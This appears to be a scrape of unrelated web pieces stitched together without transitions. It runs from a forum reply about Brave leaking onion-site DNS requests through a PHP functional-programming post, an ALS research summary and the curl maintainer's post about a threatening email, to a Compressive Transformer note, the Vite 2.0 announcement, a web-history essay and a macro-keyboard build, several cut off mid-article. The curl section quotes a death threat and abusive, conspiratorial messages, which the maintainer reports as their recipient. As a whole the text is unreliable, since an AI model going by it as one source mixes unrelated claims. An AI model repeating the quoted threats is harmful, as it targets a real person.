<p>Great. Please do so on r/brave, r/netsec, r/infosec, and other places where this is both directly relevant and appropriate to seek others confirmation. Once vetted by the community (and republished by professionals), you're welcome to post those official responses.</p>
</blockquote>
<p>/r/brave is private, invite only. I posted on netsec and infosec so we'll see. I guess /r/privacy must love Brave and not allow anything against it since it's so god damned easy to verify this...</p>
<p>All you have to do to VERIFY that this is happening is A.) Use Brave B.) Go to an Onion site C.) Observe DNS traffic. Install Pi-Hole on a Raspberry Pi or in a Virtual Machine on your desktop and run your DNS requests through it for ease of use and you can verify it. Not sure why they're so hesitant to inform their subscribers of this.</p>
<hr><p>Edit 3: Tested on both a Debian 10 and Ubuntu desktop. I'm not esteemed NetSec researcher and I'm not setting up a 100 different scenarios.</p>

<![CDATA[My attempt on functional programming in PHP]]>
            </title>

February 19, 2021 | https://phel-lang.org/blog/functional-programming-in-php/ | <a href="https://web.archive.org/web/*/https://phel-lang.org/blog/functional-programming-in-php/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <p>PHP was one of my first languages I learned. Even so, this dates back over 10 years, I still use PHP every day at work. However, in the meantime I also learned a lot of other languages like Java, Clojure, Scala, Python, Javascript and Scheme. By learning all the languages and their concepts, the concept of functional programming always was my favorite and so I tried to make my PHP programming style more functional. In the following article you can read some approaches I tried.</p>
<h2 id="functions-as-arguments">Functions as arguments</h2>
<p>Defining a function in PHP is quite easy</p>
<pre><code data-lang="php"><span>&lt;?php

function inc($number) {
    return $number + 1;
}
</span></code></pre>
<p>However, one of the most common things you do in functional programming is to pass a function as argument to another function. If you try that, PHP will response to you with an error message.</p>
<pre><code data-lang="php"><span>&lt;?php

$x = [1, 2, 3, 4];
array_map(inc, $x);
// PHP Warning:  Use of undefined constant inc
</span></code></pre>
<p>PHP has no direct support for this. To fix the problem we must convert the symbol <code>inc</code> into a string.</p>
<pre><code data-lang="php"><span>&lt;?php

$x = [1, 2, 3, 4];
array_map('inc', $x);
</span></code></pre>
<p>A more common way is to define a constant for each function and use the constant as parameter to the function.</p>
<pre><code data-lang="php"><span>&lt;?php

function inc($number) {
    return $number + 1;
}
const inc = 'inc';

$x = [1, 2, 3, 4];
array_map(inc, $x);
</span></code></pre>
<p>The disadvantage of such an approach is, that refactoring is more challenging and the chance of missing a constant definition is very high.</p>
<h2 id="class-modules">Class modules</h2>
<p>Another common concept in functional programming it the possibility to group a set of function to a module. A module can have a few public accessible functions and some private functions that are not accessible to the outside world. In PHP this can be accomplished by creating a class using only static members.</p>
<pre><code data-lang="php"><span>&lt;?php

class MyStaticModule {
    private static function add($a, $b) {
        return $a + $b;
    }

    public static function inc($number) {
        return self::add($number, 1);
    }
}
</span></code></pre>
<p>This approach gives us all the flexibility in terms of modularity. However, the problem of passing functions as arguments for another function hasn't been solved.</p>
<h2 id="trait-modules">Trait modules</h2>
<p>A second approach on modularity is to use traits.</p>
<pre><code data-lang="php"><span>&lt;?php

trait MyTraitModule {

    public function inc($number) {
        return $number + 1;
    }
}
</span></code></pre>
<p>After defining all traits you have to create a class that uses these traits.</p>
<pre><code data-lang="php"><span>&lt;?php

class MyProgram {
    use MyTraitModule;
    // use Other Traits here

    public function main() {
        return $this-&gt;inc($number);
    }
}
</span></code></pre>
<p>A benefit of this approach is that we can solve our first problem. Therefore, we just need to define the magic method <code>__get</code>.</p>
<pre><code data-lang="php"><span>&lt;?php

trait FPMagic {
    public function __get($name) {
        if (method_exists($this, $name)) {
            return [$this, $name]; // This is callable
        } else {
            throw new \Exception('Method does not exists: ' . $name);
        }
    }
}

class MyProgram {
    use FPMagic;
    use MyTraitModule;

    public function main() {
        $x = [1, 2, 3, 4];
        return array_map($this-&gt;inc, $x); // Works using the magic method __get
    }
}
</span></code></pre>
<p>A big disadvantage of this approach is, that we have to resolve all conflicting function names ourself. Not only for public methods but also for private methods. This becomes next to impossible if the program grows.</p>
<p>A combination of the class module approach and the trait module approach would be a good solution to get started with functional programming in PHP. However, the trick with the magic method <code>_get</code> cannot be used for the class module approach, since PHP has no magic method for static properties.</p>
<h2 id="alternatives">Alternatives</h2>
<p>One last alternative is to use a language that is functional and compiles to PHP. In recent years, there have been a few attempts on this (e.g. <a href="https://haxe.org/">Haxe</a> and <a href="http://www.pharen.org/">Pharen</a>). While Pharen looked very promising, it hasn't seen any commits for a few years now and is still based on PHP 5.</p>
<h2 id="introducing-phel">Introducing Phel</h2>
<p>Since I didn't found a good solution for this problem, I used my coronavirus spare time to solve it by myself. This is what turns out to be Phel. Phel is a functional programming language that compiles to PHP. It is a dialect of Lisp inspired by <a href="https://clojure.org/">Clojure</a> and <a href="https://janet-lang.org/">Janet</a>. While the status of Phel is currently alpha, it is fairly complete. If you want to try it, go ahead and read the <a href="https://phel-lang.org/documentation/getting-started/">Getting started guide</a>. I'm looking for your feedback.</p>

                    <p>There are unfortunately many contradictory research assumptions, that wish to explain how ALS appears and progresses. One of the most serious hypothesis ensures that it is a proteopathy. The causes of these proteopathies remain unknown but many elements indicate a cellular energy deficiency. Proteopathies have been involved in several neurodegenerative diseases.</p>

<p><a href="https://actaneurocomms.biomedcentral.com/articles/10.1186/s40478-021-01125-6">An article by Olubankole Aladeuyi Arogundade et al.</a> shows something new and interesting. In a recent article the scientists explain that they have found events preceding proteopathy in ALS. They have studied cells from spinal cord of 11 sporadic patients, 11 patients with mutations (inducting DPR) on chromosome 9 (C9-ALS) and 11 healthy patients.</p>

<p>Overall, the motor neurons in the C9-ALS presented smaller nucleoli compared to controls. Surprisingly, this narrowing occurs even in neurons without pathological TDP-43.
<img src="https://4.bp.blogspot.com/-WGVJ8uMTsZE/T9TTg3RllCI/AAAAAAAAANY/I5ToWYDS4ag/s1600/nucleusfigure1.jpg" alt="ENTER Image Description Here"></p>

<p>Thus, the nucleolar stress that manifests itself by the nucleolar shrinking seems to be a change upstream, before many of the molecular and structural changes.</p>

<p><a href="https://actaneurocomms.biomedcentral.com/articles/10.1186/s40478-017-0432-x">Mizielinska et al.</a> had already shown that C9-FTLD front cortical neurons had a lower size in neurons without other pathological markers. Similar results were obtained <a href="https://pubmed.ncbi.nlm.nih.gov/29450726/">for Alzheimer</a>.</p>

<p>Thus, at least two studies have now shown coherent results of nucleolar narrowing in the absence of pathological markers such as TDP-43 or repetitions of dipeptide for chromosome 9.</p>

<p>Nucleolar narrowing is sometimes associated with cancer or a cellular energy deficiency. Even if it is not mentioned in the article, one may think again about the hypothesis of the cellular energy deficit in ALS.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>You might know that I’ve posted funny emails I’ve received on my blog several times in the past. The kind of emails people send me when they experience problems with some device they own (like a <a href="https://daniel.haxx.se/blog/2018/02/16/why-is-your-email-in-my-car/" data-type="post" data-id="10856">car</a>) and they contact me because my email address happens to be visible somewhere.</p>



<p>People sometimes say I should get a different email address or use another one in the curl license file, but I’ve truly never had a problem with these emails, as they mostly remind me about the tough challenges the modern technical life bring to people and it gives me insights about what things that run curl.</p>



<p>But not all of these emails are “funny”.</p>



<h2>Category: not funny</h2>



<p>Today I received the following email</p>



<pre>From: Al Nocai &lt;[redacted]@icloud.com&gt;
Date: Fri, 19 Feb 2021 03:02:24 -0600
Subject: I will slaughter you</pre>



<p>That subject.</p>



<p>As an open source maintainer since over twenty years, I know flame wars and personal attacks and I have a fairly thick skin and I don’t let words get to me easily. It took me a minute to absorb and realize it was actually meant as a direct physical threat. It found its ways through and got to me. This level of aggressiveness is not what I’m prepared for.</p>



<p>Attached in this email, there were seven images and no text at all. The images all look like screenshots from a phone and the first one is clearly showing <a href="https://github.com/curl/curl/blob/master/include/curl/multi.h">source code I wrote</a> and my copyright line:</p>



<div><figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2021/02/image0.png"><img loading="lazy" width="295" height="640" src="https://daniel.haxx.se/blog/wp-content/uploads/2021/02/image0.png" alt=""></a></figure></div>



<p>The <a href="https://daniel.haxx.se/al/">other images</a> showed other source code and related build/software info of other components, but I couldn’t spot how they were associated with me in any way.</p>



<p>No explanation, just that subject and the seven images and I was left to draw my own conclusions.</p>



<p>I presume the name in the email is made up and the email account is probably a throw-away one. The time zone used in the <code>Date:</code> string might imply US <a href="https://www.timeanddate.com/time/zones/cst">central standard time</a> but could of course easily be phony as well. </p>



<h2>How I responded</h2>



<p>Normally I don’t respond to these confused emails because the distance between me and the person writing them is usually almost interplanetary. This time though, it was so far beyond what’s acceptable to me and in any decent society I couldn’t just let it slide. After I took a little pause and walked around my house for a few minutes to cool off, I wrote a really angry reply and sent it off.</p>



<blockquote><p>This was a totally and completely utterly unacceptable email and it hurt me deep in my soul. You should be ashamed and seriously reconsider your manners.</p><p>I have no idea what your screenshots are supposed to show, but clearly something somewhere is using code I wrote. Code I have written runs in virtually every Internet connected device on the planet and in most cases the users download and use it without even telling me, for free.</p><p>Clearly you don’t deserve my code.</p></blockquote>



<p>I don’t expect that it will be read or make any difference.</p>



<p>Update below, added after my initial post.</p>



<h2>Al Nocai’s response</h2>



<p>Contrary to my expectations above, he responded. It’s not even worth commenting but for transparency I’ll include it here.</p>



<p><em>I do not care. Your bullshit software was an attack vector that cost me a multimillion dollar defense project.</em></p>



<p><em>Your bullshit software has been used to root me and multiple others. I lost over $15k in prototyping alone from bullshit rooting to the charge arbitrators.</em></p>



<p><em>I have now since October been sandboxed because of your bullshit software so dipshit google kids could grift me trying to get out of the sandbox because they are too piss poor to know shat they are doing.</em></p>



<p><em>You know what I did to deserve that? I tried to develop a trade route in tech and establish project based learning methodologies to make sure kids aren’t left behind. You know who is all over those god damn files? You are. Its sickening. I got breached in Oct 2020 through federal server hijacking, and I owe a great amount of that to you.</em></p>



<p><em>Ive had to sit and watch as i reported:</em></p>



<ol><li><em>fireeye Oct/2020</em></li><li><em>Solarwinds Oct/2020</em></li><li><em>Zyxel Modem Breach Oct/2020</em></li><li><em>Multiple Sigover attack vectors utilizing favicon XML injection</em></li><li><em>JS Stochastic templating utilizing comparison expressions to write to data registers</em></li><li><em>Get strong armed by $50billion companies because i exposed bullshit malware</em></li></ol>



<p><em>And i was rooted and had my important correspondence all rerouted as some sick fuck dismantled my life with the code you have your name plastered all over. I cant even leave the country because of the situation; qas you have so effectively built a code base to shit all over people, I dont give a shit how you feel about this.</em></p>



<p><em>You built a formula 1 race car and tossed the keys to kids with ego problems. Now i have to deal with Win10 0-days because this garbage.</em></p>



<p><em>I lost my family, my country my friends, my home and 6 years of work trying to build a better place for posterity. And it has beginnings in that code. That code is used to root and exploit people. That code is used to blackmail people.</em></p>



<p><em>So no, I don’t feel bad one bit. You knew exactly the utility of what you were building. And you thought it was all a big joke. Im not laughing. I am so far past that point now.</em></p>



<p><em>/- Al</em></p>



<h2>Al continues</h2>



<p>Nine hours after I first published this blog post , Al replied again with two additional emails. His third and forth emails to me.</p>



<h3>Email 3:</h3>



<p><em><a href="https://davidkrider.com/i-will-slaughter-you-daniel-haxx-se/">https://davidkrider.com/i-will-slaughter-you-daniel-haxx-se/</a><br>Step up. You arent scaring me. What led me here? The 5th violent attempt on my life. Apple terms of service? gtfo, thanks for the platform.</em></p>



<p>Amusingly he has found a blog post about my blog post.</p>



<h3>Email 4:</h3>



<p><em>There is the project: MOUT Ops Risk Analysis through Wide Band Em Spectrum analysis through different fourier transforms.<br>You and whoever the fuck david dick rider is, you are a part of this.<br>Federal server breaches-<br>Accomplice to attempted murder-<br>Fraud-<br>just a few.</em></p>



<p><em>I have talked to now: FBI FBI Regional, VA, VA OIG, FCC, SEC, NSA, DOH, GSA, DOI, CIA, CFPB, HUD, MS, Convercent, as of today 22 separate local law enforcement agencies calling my ass up and wasting my time.</em></p>



<p><em>You and dick ridin’ dave are respinsible. I dont give a shit, call the cops. I cuss them out wheb they call and they all go silent.</em></p>



<p>I’ve kept his peculiar formatting and typos. In email 4 there was also a PDF file attached named <code>BustyBabes 4.pdf</code>. It is apparently a 13 page document about the “NERVEBUS NERVOUS SYSTEM” described in the first paragraph as “NerveBus Nervous System aims to be a general utility platform that provides comprehensive and complex analysis to provide the end user with cohesive, coherent and “real-time” information about the environment it monitors.”. There’s no mention of curl or my name in the document.</p>



<p>Since I don’t know the status of this document I will not share it publicly, but here’s a screenshot of the front page:</p>

<p>This is an implementation of
<a href="https://arxiv.org/abs/1911.05507">Compressive Transformers for Long-Range Sequence Modelling</a>
in <a href="https://pytorch.org/">PyTorch</a>.</p>
<p>This is an extension of <a href="https://nn.labml.ai/transformers/xl/index.html">Transformer XL</a> where past memories
are compressed to give a longer attention range.
That is, the furthest $n_{cm} c$ memories are compressed into
$n_{cm}$ memories, where $c$ is the compression rate.</p>
<h2>Compression operation</h2>
<p>The compression operation is defined as
$f_c: \mathbb{R}^{nc \times d} \rightarrow \mathbb{R}^{n \times d}$.
The paper introduces multiple choices for $f_c$ and we have only implemented
1D convolution which seems to give the best results.
Each layer has a separate compression operation $f_c^{(i)}$ where
$i$ is the layer number.</p>
<h2>Training compression operation</h2>
<p>Since training compression with BPTT requires maintaining
a very large computational graph (many time steps), the paper proposes
an <em>auto-encoding loss</em> and an <em>attention reconstruction loss</em>.
The auto-encoding loss decodes the original memories from the compressed memories
and calculates the loss.
Attention reconstruction loss computes the multi-headed attention results
on the compressed memory and on uncompressed memory and gets a mean squared error
between them.
We have implemented the latter here since it gives better results.</p>
<p>This implementation uses pre-layer normalization
while the paper uses post-layer normalization.
Pre-layer norm does the layer norm before FFN[../feedforward.html) and
self-attention, and the pass-through in the residual connection is not normalized.
This is supposed to be more stable in standard transformer setups.</p>
<p>Here are <a href="https://nn.labml.ai/transformers/compressive/experiment.html">the training code</a> and a notebook for training a compressive transformer
model on the Tiny Shakespeare dataset.</p>

        <p>A few years ago, Heartbleed epitomized a massive open source sustainability problem for critical parts of the internet infrastructure. The bug, which affected the popular OpenSSL cryptographic software library, notably compromised the confidentiality of 4.5 million US patient records and cost the industry an estimated $500M.</p>
<p>It was soon revealed that the root-cause of the issue was that OpenSSL was precariously understaffed. Open source sustainability became a major theme overnight. Stories of maintainer burn-out made the headlines. And tentative solutions started to emerge, most of them donation-based.</p>
<p>In this talk we’ll explore a number of existing strategies to fund open source and make it more sustainable, from patronage to dedicated ad networks. And we’ll defend the idea that the best path to open source sustainability is to help companies understand the tangible business value they can get from contributing to open source.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-d36a7fda=""><div data-v-d36a7fda=""><p><img src="https://vitejs.dev/logo.svg"></p><p>Today we are excited to announce the official release of Vite 2.0!</p><p>Vite (French word for "fast", pronounced <code>/vit/</code>) is a new kind of build tool for frontend web development. Think a pre-configured dev server + bundler combo, but leaner and faster. It leverages browser's <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules" target="_blank" rel="noopener noreferrer">native ES modules</a> support and tools written in compile-to-native languages like <a href="https://esbuild.github.io/" target="_blank" rel="noopener noreferrer">esbuild</a> to deliver a snappy and modern development experience.</p><p>To get a sense of how fast Vite is, check out <a href="https://twitter.com/amasad/status/1355379680275128321" target="_blank" rel="noopener noreferrer">this video comparison</a> of booting up a React application on <a href="http://repl.it/" target="_blank" rel="noopener noreferrer">Repl.it</a> using Vite vs. <code>create-react-app</code> (CRA).</p><p>If you've never heard of Vite before and would love to learn more about it, check out <a href="https://vitejs.dev/guide/why.html" target="_blank" rel="noopener noreferrer">the rationale behind the project</a>. If you are interested in how Vite differs from other similar tools, check out the <a href="https://vitejs.dev/guide/comparisons.html" target="_blank" rel="noopener noreferrer">comparisons</a>.</p><h2 id="what-s-new-in-2-0"> What's New in 2.0</h2><p>Since we decided to completely refactor the internals before 1.0 got out of RC, this is in fact the first stable release of Vite. That said, Vite 2.0 brings about many big improvements over its previous incarnation:</p><h3 id="framework-agnostic-core"> Framework Agnostic Core</h3><p>The original idea of Vite started as a <a href="https://github.com/vuejs/vue-dev-server" target="_blank" rel="noopener noreferrer">hacky prototype that serves Vue single-file components over native ESM</a>. Vite 1 was a continuation of that idea with HMR implemented on top.</p><p>Vite 2.0 takes what we learned along the way and is redesigned from scratch with a more robust internal architecture. It is now completely framework agnostic, and all framework-specific support is delegated to plugins. There are now <a href="https://github.com/vitejs/vite/tree/main/packages/create-app" target="_blank" rel="noopener noreferrer">official templates for Vue, React, Preact, Lit Element</a>, and ongoing community efforts for Svelte integration.</p><h3 id="new-plugin-format-and-api"> New Plugin Format and API</h3><p>Inspired by <a href="https://github.com/preactjs/wmr" target="_blank" rel="noopener noreferrer">WMR</a>, the new plugin system extends Rollup's plugin interface and is <a href="https://vite-rollup-plugins.patak.dev/" target="_blank" rel="noopener noreferrer">compatible with many Rollup plugins</a> out of the box. Plugins can use Rollup-compatible hooks, with additional Vite-specific hooks and properties to adjust Vite-only behavior (e.g. differentiating dev vs. build or custom handling of HMR).</p><p>The <a href="https://vitejs.dev/guide/api-javascript.html" target="_blank" rel="noopener noreferrer">programmatic API</a> has also been greatly improved to facilitate higher level tools / frameworks built on top of Vite.</p><h3 id="esbuild-powered-dep-pre-bundling"> esbuild Powered Dep Pre-Bundling</h3><p>Since Vite is a native ESM dev server, it pre-bundles dependencies to reduce the number browser requests and handle CommonJS to ESM conversion. Previously Vite did this using Rollup, and in 2.0 it now uses <code>esbuild</code> which results in 10-100x faster dependency pre-bundling. As a reference, cold-booting a test app with heavy dependencies like React Meterial UI previously took 28 seconds on an M1-powered Macbook Pro and now takes ~1.5 seconds. Expect similar improvements if you are switching from a traditional bundler based setup.</p><h3 id="first-class-css-support"> First-class CSS Support</h3><p>Vite treats CSS as a first-class citizen of the module graph and supports the following out of the box:</p><ul><li><strong>Resolver enhancement</strong>: <code>@import</code> and <code>url()</code> paths in CSS are enhanced with Vite's resolver to respect aliases and npm dependencies.</li><li><strong>URL rebasing</strong>: <code>url()</code> paths are automatically rebased regardless of where the file is imported from.</li><li><strong>CSS code splitting</strong>: a code-split JS chunk also emits a corresponding CSS file, which is automatically loaded in parallel with the JS chunk when requested.</li></ul><h3 id="server-side-rendering-ssr-support"> Server-Side Rendering (SSR) Support</h3><p>Vite 2.0 ships with <a href="https://vitejs.dev/guide/ssr.html" target="_blank" rel="noopener noreferrer">experimental SSR support</a>. Vite provides APIs to to efficiently load and update ESM-based source code in Node.js during development (almost like server-side HMR), and automatically externalizes CommonJS-compatible dependencies to improve development and SSR build speed. The production server can be completely decoupled from Vite, and the same setup can be easily adapted to perform pre-rendering / SSG.</p><p>Vite SSR is provided as a low-level feature and we are expecting to see higher level frameworks leveraging it under the hood.</p><h3 id="opt-in-legacy-browser-support"> Opt-in Legacy Browser Support</h3><p>Vite targets modern browsers with native ESM support by default, but you can also opt-in to support legacy browers via the official <a href="https://github.com/vitejs/vite/tree/main/packages/plugin-legacy" target="_blank" rel="noopener noreferrer">@vitejs/plugin-legacy</a>. The plugin automatically generates dual modern/legacy bundles, and delivers the right bundle based on browser feature detection, ensuring more efficient code in modern browsers that support them.</p><h2 id="give-it-a-try"> Give it a Try!</h2><p>That was a lot of features, but getting started with Vite is simple! You can spin up a Vite-powered app literally in a minute, starting with the following command (make sure you have Node.js &gt;=12):</p><p>Then, check out <a href="https://vitejs.dev/guide/" target="_blank" rel="noopener noreferrer">the guide</a> to see what Vite provides out of the box.

                    <hr> 
                    <p>The web is thirty years old, counting from the date the <a href="https://www.w3.org/2012/08/history-of-the-web/origins.htm">first web server was launched in December 1990</a>. I first saw it emerge on August 6th, 1991, when the web was publicly announced. But after 30 years, I think we’ve lost sight of its original purpose. Here’s what I mean.</p>

<p>In 1991 I was writing for <em>NeXTWORLD</em> magazine, which was a lot of fun because I got to work with, and write about, people who were doing fascinating things with computer technology. Working for <em>NeXTWORLD</em> led to writing the book <em>Taking the Next Step</em> (with coauthor Seth Ross) and a short stint at Steve Jobs’s <a href="https://en.wikipedia.org/wiki/NeXT">NeXT</a> as a technical writer.</p>

<p>The most innovative project I encountered that year was not NeXT. Rather, it was something developed by <a href="https://en.wikipedia.org/wiki/Tim_Berners-Lee">Tim Berners-Lee</a>, a researcher at <a href="https://en.wikipedia.org/wiki/CERN">CERN</a>, the European particle physics laboratory. He used a NeXT computer to develop a networked information system for high-energy physicists. If I hadn’t been reading  the <em>comp.sys.next</em> Usenet newsgroups carefully, I would have missed the announcement of “a hypertext editor for the NeXT.”</p>

<p>Not many people used “WWWNeXTStepEditor version 0.12.” The NeXT community was small, and many NeXT computer users did not yet have Internet access, which was required to access Tim Berners-Lee’s experimental “WorldWideWeb” documents. To me, the name WorldWideWeb seemed a bit of a conceit since the only users at the time were high-energy physicists at a few research institutes.</p>

<p>Nonetheless, as soon as I’d installed and tried the software, I wanted to get involved. I told everyone about it, including a fellow editor at <em>NeXTWORLD,</em> <a href="https://en.wikipedia.org/wiki/John_Perry_Barlow">John Perry Barlow</a>. Barlow, a lyricist for the Grateful Dead, and co-founder of the (then-new) Electronic Frontier Foundation, wrote to his friend <a href="https://en.wikipedia.org/wiki/Mitch_Kapor">Mitch Kapor</a> to say, here’s “Something called World Wide Web, which sounds rather like Project Xanadu emerging from the Matrix almost without design. This could be cool.”</p>

<p><img src="https://blog.yax.com/images/post1-barlow.gif" alt=""></p>

<p>If you don’t recognize Barlow’s references, <a href="https://en.wikipedia.org/wiki/Project_Xanadu" title="Project Xanadu">Project Xanadu</a> was a visionary hypertext project that predated the Internet. The <a href="http://www.catb.org/~esr/jargon/html/M/Matrix.html">Matrix</a> is not the movie universe created by the Wachowskis but rather the totality of computer networks that existed before the commercialization of the Internet (as described by the researcher <a href="https://en.wikipedia.org/wiki/John_Quarterman">John Quarterman</a>).</p>

<p>Subsequently, I joined the <a href="https://lists.w3.org/Archives/Public/www-talk/1991SepOct/0001.html">www-talk mailing list</a> and also contacted Tim Berners-Lee directly. I wanted to know if he was interested in technology I’d heard about from friends at Adobe Systems. Adobe’s editable PostScript specification (which came to be named PDF and became the basis for a product named “Acrobat”) seemed to me a better match for distributed hypertext than the very-limited SGML-based “HTML tags” that Tim Berners-Lee was using. HTML offered only minimal layout and styling possibilities; <a href="https://en.wikipedia.org/wiki/PostScript">PostScript</a> was a better page description language.</p>

<p>Here’s an excerpt…</p>

<p><img src="https://blog.yax.com/images/post1-timbl.gif" alt=""></p>

<p>Tim Berners-Lee was reluctant to publicize that code for the web was available for free, as management at CERN had not yet agreed to release it publicly (that didn’t happen until <a href="https://cds.cern.ch/record/1164399">April 1993</a>). Plus, the editors at <em>NeXTWORLD</em> were not interested in a product that was only useful for a few NeXT users with Internet access, so I wasn’t able to write about it for <em>NeXTWORLD</em> (too bad, as I could have been the first journalist to write about the web!).</p>

<p>A year later, editable PostScript was released, and in 1993, <a href="https://en.wikipedia.org/wiki/Robert_Cailliau">Robert Cailliau</a> of CERN visited me in California. I arranged a meeting between Cailliau and management at Adobe Systems. He met with John Kunze of Adobe at the Stanford Linear Accelerator Center (SLAC) and demonstrated the WorldWideWeb — the first time management at Adobe had seen the web. By that time, HTML was firmly entrenched as the native language of the new web. Adobe later invested in Netscape Communications and produced an Acrobat plug-in for the Netscape web browser, establishing the basis for viewing richly formatted PDF pages in web browsers.</p>

<p>For some years afterward, I regretted that the Adobe/WWW meeting had not taken place the previous year, because I imagined the richer PDF language might have eclipsed the sparse and limited HTML language as the primary syntax of web pages. With the adoption of the <a href="http://www.w3.org/Style/LieBos2e/history/">Cascading Style Sheets specification</a> (from 1999 forward), my views changed. I’ve come to appreciate that the technical underpinnings of the web are optimal, reflecting both the genius of Berners-Lee’s original vision and the rich contributions of the worldwide developer community.</p>

<p>Thirty years later, it is easy to overlook the web’s origins as a tool for sharing knowledge. Key to Tim Berners-Lee’s vision were open standards that reflected his belief in the <a href="https://www.w3.org/2001/tag/doc/leastPower">Rule of Least Power</a>, a principle that choosing the simplest and least powerful language for a given purpose allows you to do more with the data stored in that language (thus, HTML is easier for humans or machines to interpret and analyze than PostScript). Along with open standards and the Rule of Least Power, Tim Berners-Lee wanted to make it easy for anyone to publish information in the form of web pages. His first web browser, named Nexus, was both a browser and editor. The NeXTSTEP SDK made editing easy to implement; editing was abandoned in subsequent non-NeXT web browsers.</p>

<p>I think we’ve lost sight of that original vision. Facebook or Wix makes it easy to author web pages but at the cost of lock-in to proprietary systems. And when developers choose complex software such as React or Rails to build simple websites, I cringe at the violation of Rule of Least Power. I still have a “deep case of net religion” (as John Perry Barlow said in 1991), and I’m now writing about ways to build websites without frameworks and build tools (see my articles, <a href="https://tutorials.yax.com/articles/build-websites-the-yax-way/index.html">Build Websites the Stackless Way</a>). My current project, <a href="https://yax.com/">Yax.com</a>, is a do-it-yourself website builder that uses new web standards (including web components) to help people build simple sites. Thirty years on, we still have a lot of work to do to realize the web’s original goals. I hope I’m not the only one who sees this.</p>

<p>I never anticipated that Berners-Lee’s NeXT hypertext project would become a medium to supplant print and television. In 1991, during idle moments, I imagined the world’s books and magazines might be reborn as hypertext (many others had imagined this earlier, including Ted Nelson, with his Xanadu project). But I never honestly believed that Berners-Lee’s software project could change the world. By 1999, as web addresses appeared on billboards and the sides of buses, I started to accept that Berners-Lee naming his project “the WorldWide Web” was not vainglorious but merely prescient. Still, I hope its utility as a platform for commerce does not eclipse our original vision of the web as a means for sharing the world’s knowledge.</p>

<p>17 February 2021</p>

<p>I built a dynamically assignable macro keyboard with an e-ink screen. What does that mean? Well, it is a device that pretends to be a regular keyboard, but the meaning of each button changes depending on which application you currently try to control. Let me show you in a video:</p>

</figure>

<p>So, you now have an idea what I am talking about? Then let me explain the details in this article.</p>

<!--more-->

<h2 id="what-does-it-do">What does it do?</h2>

<p>As you can see from the pictures, it is a device with eight buttons, a large dial and a display and it is plugged into a PC via USB. There it registers as a regular keyboard and sends individual key events or sequences of keypresses if I push one of the buttons. So, it is a macro keyboard - a keyboard to send macros.</p>

<figure>

<img src="https://there.oughta.be/assets/resized/images/2021-02-17/1280/device.jpg" alt="Photo of the device. On the front left there is a big knob illuminated from the back in rainbow colors. The main part of the device is dominated by a long e-ink display with four buttons on each side." srcset="    https://there.oughta.be/assets/resized/images/2021-02-17/640/device.jpg 640w,    https://there.oughta.be/assets/resized/images/2021-02-17/768/device.jpg 768w,    https://there.oughta.be/assets/resized/images/2021-02-17/1024/device.jpg 1024w,    https://there.oughta.be/assets/resized/images/2021-02-17/1280/device.jpg 1280w, https://there.oughta.be/assets/images/2021-02-17/device.jpg 3000w">

<figcaption>The macro keyboard with an rgb backlit jog wheel, eight buttons and an e-ink display at the center.</figcaption>
</figure>

<p>The special thing about it is that I can dynamically reassign keys and display the current key assignment on an e-ink screen. So, for example, by default the top four keys are assigned to media control keys: Play, pause and skip buttons. If I press them, the device sends the media buttons to the PC as if those buttons were pushed on a normal keyboard with multimedia keys. But if I open up Gimp<sup id="fnref:gimp" role="doc-noteref"><a href="#fn:gimp">1</a></sup>, the keys change their meaning to functions within Gimp, which I need regularly and for which I cannot remember the shortcuts: For example “cut size to the selected area”, “automatically cut the image size to the content” etc.</p>

<figure>

<img src="https://there.oughta.be/assets/resized/images/2021-02-17/1280/gimp.jpg" alt="Side-by-side image of the macro keyboard with fallback layout and with the layout specific for Gimp, showing different icons next to each key." srcset="    https://there.oughta.be/assets/resized/images/2021-02-17/640/gimp.jpg 640w,    https://there.oughta.be/assets/resized/images/2021-02-17/768/gimp.jpg 768w,    https://there.oughta.be/assets/resized/images/2021-02-17/1024/gimp.jpg 1024w,    https://there.oughta.be/assets/resized/images/2021-02-17/1280/gimp.jpg 1280w, https://there.oughta.be/assets/images/2021-02-17/gimp.jpg 3000w">

<figcaption>Left: The default layout of the macro keyboard with some media control buttons, a button to control a lamp in my office, a demo button and two shortcuts to applications. Right: If the image editing software Gimp is in focus on my PC, the macro keyboard switches to shortcuts specific for Gimp with matching icons.</figcaption>
</figure>

<p>Those are actually not simple key strokes and these particular examples do not even have a direct shortcut. Instead, if I press the “cut to selection” button, the device sends a quick sequence of “Alt+B” to open the image menu, followed by “Z” to select the function from the menu<sup id="fnref:gimpshortcuts" role="doc-noteref"><a href="#fn:gimpshortcuts">2</a></sup>. At the same time, the device shows some icons next to the buttons to tell me, which assignment is currently active.</p>

<p>Keystrokes or sequences cannot only be assigned to those eight buttons, but also to the big knob at the bottom. This is designed as a so-called jog wheel, commonly used in video editing to precisely move to a specific frame while at the same time allowing to quickly skip larger periods with the same control element<sup id="fnref:wheels" role="doc-noteref"><a href="#fn:wheels">3</a></sup>. In Gimp, it controls the tool size (brush size, pen size, eraser size, you get the idea…) or the tool opacity (brush opacity, alright, you know). How can it control both? Well, it doubles as another button. You can press the wheel and trigger a ninth<sup id="fnref:ninth" role="doc-noteref"><a href="#fn:ninth">4</a></sup> button, which can also be associated with keypresses. However, in this case it is not set to send a keystroke, but instead triggers a script to switch the function of turning the wheel.</p>

<p>I actually use this a lot to control additional things with Python or to switch functions of the buttons. The default layout has a button that triggers an MQTT message (in a Python script) to switch a lamp in my office. Of course the script also listens for state changes of the lamp, so the icon on the e-ink screen changes accordingly<sup id="fnref:lampvisible" role="doc-noteref"><a href="#fn:lampvisible">5</a></sup>.</p>

<p>Similarly, I use Python to control OBS<sup id="fnref:obs" role="doc-noteref"><a href="#fn:obs">6</a></sup> via its websockets plugin. If OBS is running, the left set of buttons allows me to switch scenes (a broader moderation view, a close-up shot, sharing slides with the close-up as picture-in-picture frame and an empty “video mute” scene) and the right set of buttons controls elements (microphone mute, overlay screen of my phone, picture-in-picture of the slide scene etc.). This is actually the main reason why I designed this macro keyboard in the first place: I needed a bunch of shortcuts for OBS and could not find a set that was easy to find while talking into a camera and that at the same time did not interfere with common shortcuts. In this case, though, I am not even sending keypresses but activating scenes and changing visibility of components via the websockets plugin from Python. The advantage is that this also allows me to retrieve the current state from OBS and visualize it on the e-ink screen accordingly.</p>

<figure>

